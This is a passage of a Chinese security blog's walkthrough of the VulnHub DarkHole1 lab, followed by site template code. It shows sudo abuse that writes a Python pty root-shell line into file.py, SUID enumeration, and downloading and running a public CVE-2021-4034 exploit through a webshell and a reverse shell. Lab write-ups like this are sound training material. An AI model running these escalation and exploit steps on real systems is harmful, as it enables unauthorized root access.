+<p>user.txt没权限看不了，还有个空的file.py文件</p>
+<p>查看当前用户可运行的文件或命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>需要刚才获取到的密码root123</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002133125490.png" alt="image-20221002133125490"  />
+
+<p>读取到john能以root权限执行file.py</p>
+<p>接下来把john提权到root</p>
+<p>写入file.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; file.py</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 /home/john/file.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002133855135.png" alt="image-20221002133855135"></p>
+<p>成功拿到root</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002134005729.png" alt="image-20221002134005729" style="zoom:50%;" />
+
+<h3 id="方法二（policykit-1-CVE-2021-4034）："><a href="#方法二（policykit-1-CVE-2021-4034）：" class="headerlink" title="方法二（policykit-1 CVE-2021-4034）："></a>方法二（policykit-1 CVE-2021-4034）：</h3><p>查找其他具有SUID权限的命令或文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002115004413.png" alt="image-20221002115004413" style="zoom:50%;" />
+
+<p>&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1对应CVE-2021-4034</p>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<p>clone到kali</p>
+<p>打包zip，开启http</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r CVE-2021-4034.zip CVE-2021-4034/</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑下载文件（蚁剑需要重新上传一个 后缀为 phar的马然后反弹的shell 即可执行php-reverse-shell.phar）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip:80/CVE-2021-4034.zip</span><br></pre></td></tr></table></figure>
+
+<p>unzip解压 执行.&#x2F;cve-2021-4034</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002124953661.png" alt="image-20221002124953661"></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/avatar.png" alt="tpaer">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>tpaer
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/posts/452430507.html" target="_blank">vulnhub darkhole1 靶场通关</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>nice or terrible.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="" target="_blank"></a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/category/web/">web</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/posts/2657481293.html" class="prev-prefix">« </a> 上一篇：    <a href="/posts/2657481293.html" title="发布于 2023-12-11 08:06">Chrome插件SwitchyOmega本地不代理解决</a>
+                        <br>
+                    
+                    
+                </div>
+            </div>
+             
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>Tpaer Blog</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/avatar.png">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://onetpaer.github.io" target="_blank"><span>tpaer</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="GitHub" href="https://github.com/onetpaer" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "onetpaer",
+        GitHubRepositories : "hacker-note",
+
+        User             : "tpaer",
+        UserAvatar       : "/image/sidebar/avatar.png",
+        WebsiteStartDate : "2023-01-01",
+        Home             : "https://onetpaer.github.io",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Tpaer BLOG",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) Welcome back!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/tlogo.png",
+            dark  : "/image/website/logo/tlogo.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.png",
+            
+        ],
+        HomeBannerText  : "Cybersecurity",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.png",
+            
+                "/image/header/article3.png",
+            
+                "/image/header/article4.png",
+            
+        ],
+
+        OtherBannerText : "All because of love",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "Tpaer Blog",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/onetpaer",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Tpaer Blog",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "TIB5V1ZDSN",
+            apiKey        : "50d0249e92080e370df32275e4511295",
+            indexName     : "onetpaer",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "nice or terrible."
+        },
+            
+        Theme : {
+            url  : "",
+            name : ""
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
